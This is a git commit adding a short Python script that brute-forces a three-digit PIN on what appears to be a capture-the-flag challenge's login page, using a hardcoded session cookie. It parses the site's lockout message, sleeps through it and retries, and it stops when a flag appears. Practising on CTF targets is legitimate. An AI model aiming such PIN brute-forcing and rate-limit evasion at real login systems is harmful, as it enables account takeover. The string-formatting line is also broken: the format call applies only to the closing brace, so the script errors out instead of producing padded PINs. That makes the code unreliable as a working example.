b0e73d1b1b2f78fa72884366941a1d159837e0d5
Laszlo Nagy <laszlo.nagy@student.manchester.ac.uk>
2019-11-01 17:58:31 +0000

    Create pinforce.py

---
+++ pinforce.py
@@ -0,0 +1,27 @@
+import re
+import time
+
+import requests
+
+challenge_number = 104
+cookie = "ph5laj0dcctcg9nd7oujdn1art"
+highers_num = 999
+digits = 3
+
+for i in range(250, highers_num):
+
+    pin = '{0:0' + str(digits) + '}'.format(i)
+    request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login", data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})
+
+    if(request.text.__contains__("403 Forbidden")):
+        print("Waiting " + re.search("\d+(?=<\/span> seconds)", request.text).group(0) + " seconds")
+        time.sleep(int(re.search("\d+(?=<\/span> seconds)", request.text).group(0)) + 1)
+        request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login",
+                                data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})
+
+    print(pin)
+
+    if(request.text.__contains__("FLAG")):
+        print(request.text)
+        print(pin)
+        exit(-1)
